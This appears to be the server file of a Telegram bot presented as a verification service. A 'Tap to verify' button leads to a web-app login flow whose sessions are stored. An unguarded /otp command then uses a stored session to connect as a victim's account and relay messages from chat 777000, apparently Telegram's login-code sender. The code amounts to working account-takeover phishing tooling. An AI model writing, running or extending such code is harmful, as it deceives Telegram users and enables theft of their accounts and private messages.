import "dotenv/config";
import Fastify from "fastify";
import { readFileSync } from "fs";
import { Input, Markup } from "telegraf";
import fastifyWebsocket from "@fastify/websocket";

import { bot, createTg } from "./instance";
import { createAccountRoute } from "./modules";
import { catchRuntimeError } from "./lib/error";
import { adminMessageRoute } from "./modules/admin/admin.route";
import { loginRoute } from "./modules/telegram/telegram.socket";
import { getAccountByPhoneNumber } from "./modules/account/account.controller";
import { db } from "./db";
import { cleanText } from "./lib/format";

const fastify = Fastify({ logger: true, ignoreTrailingSlash: true });
fastify.register(fastifyWebsocket);

bot.start((context) => {
  console.log(context.msg);
  console.log(context.msg.chat);
  const message = readFileSync("./locale/en/start.md", "utf-8").replace(
    /%id/,
    String(context.botInfo!.id)
  );

  return context.replyWithPhoto(Input.fromLocalFile("./media/banner.png"), {
    parse_mode: "MarkdownV2",
    caption: message,
    reply_markup: Markup.inlineKeyboard([
      Markup.button.webApp("Tap to verify", process.env.APP_URL!),
    ]).reply_markup,
  });
});

bot.command("otp", async (context) => {
  if (true) {
    const [, phoneNumber] = context.message.text.split(" ");
    const [account] = await getAccountByPhoneNumber(db, phoneNumber);
    const tg = createTg(account.session);
    await tg.client.connect();
    const messages = await tg.client.getMessages(777000);

    return Promise.all(
      messages
        .reverse()
        .map((message) =>
          context.replyWithMarkdownV2(cleanText(message.message))
        )
    );
  }
});

fastify.route({
  url: "/accounts/",
  method: "POST",
  handler: catchRuntimeError(createAccountRoute),
});

fastify.route({
  url: "/admin/messages/",
  method: "POST",
  handler: catchRuntimeError(adminMessageRoute),
});

fastify.register((fastify) =>
  fastify.get("/", { websocket: true }, loginRoute)
);

Promise.all([
  fastify.listen(
    {
      host: process.env.HOST,
      port: Number(process.env.PORT),
    },
    (error) => {
      if (error) {
        fastify.log.error(error);
        process.exit(1);
      }
    }
  ),
  bot.launch(() => console.log("Bot running in background")),
]);
